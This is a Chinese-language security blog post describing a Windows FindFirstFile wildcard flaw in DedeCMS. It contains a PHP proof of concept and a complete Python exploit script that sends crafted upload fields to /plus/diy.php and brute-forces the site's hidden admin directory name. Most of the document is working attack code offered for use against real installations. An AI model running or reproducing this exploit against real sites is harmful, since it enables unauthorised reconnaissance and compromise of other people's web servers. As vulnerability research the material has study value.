---
title: "dedecms 后台爆破"
date: 2018-03-03T00:00:00+08:00
draft: false
tags: ['cms']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

在 Windows 里, 我们只需要知道文件所在目录, 通过 FindFirstFile winapi 函数就可以访问到文件.

<!--more-->

## Example

```
<?php
// ./dedecms/favicon.ico
if(@getimagesize($_GET['poc'])){
    echo 1;
}else {
    echo 0;
}
?>

get:
http://localhost/test.php?poc=./d</favicon.ico
返回: 1

http://localhost/test.php?poc=./a</favicon.ico
返回: 0

http://localhost/test.php?poc=./de</favicon.ico
返回: 1

http://localhost/test.php?poc=./ded</favicon.ico
返回: 1
```

前两位需要爆破 会花一点时间

只适用于 windows 系统

## EXP

```
import requests
import itertools
import sys

def dede_brute(url):
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789_!~@$-+=()'
    back_dir = ''
    flag = 0
    url = url + '/plus/diy.php'
    data = {
        '_FILES[dede][tmp_name]' : './../{p}<</images/adminico.gif',
        '_FILES[dede][name]' : 0,
        '_FILES[dede][size]' : 0,
        '_FILES[dede][type]' : 'image/gif'
    }

    for num in range(1,7):
        if flag:
            break
        for pre in itertools.permutations(characters,num):
            pre = ''.join(list(pre))
            data['_FILES[dede][tmp_name]'] = data['_FILES[dede][tmp_name]'].format(p=pre)
            print '[*] testing',pre
            r = requests.post(url,data=data)
            if 'Upload filetype not allow !' not in r.text and r.status_code == 200:
                flag = 1
                back_dir = pre
                data['_FILES[dede][tmp_name]'] = './../{p}<</images/adminico.gif'
                break
            else:
                data['_FILES[dede][tmp_name]'] = './../{p}<</images/adminico.gif'

    print '[+] prefix:',back_dir
    flag = 0

    for i in range(30):
        if flag:
            break
        for ch in characters:
            if ch == characters[-1]:
                flag = 1
                break
            data['_FILES[dede][tmp_name]'] = data['_FILES[dede][tmp_name]'].format(p=back_dir+ch)
            r = requests.post(url, data=data)
            if 'Upload filetype not allow !' not in r.text and r.status_code == 200:
                back_dir += ch
                print '[+] ',back_dir
                data['_FILES[dede][tmp_name]'] = './../{p}<</images/adminico.gif'
                break
            else:
                data['_FILES[dede][tmp_name]'] = './../{p}<</images/adminico.gif'

    print '[+] path:',back_dir

if __name__ == '__main__':
    if len(sys.argv) == 2:
        dede_brute(sys.argv[1])
    else:
        print '[*] usage: dede.py url'
```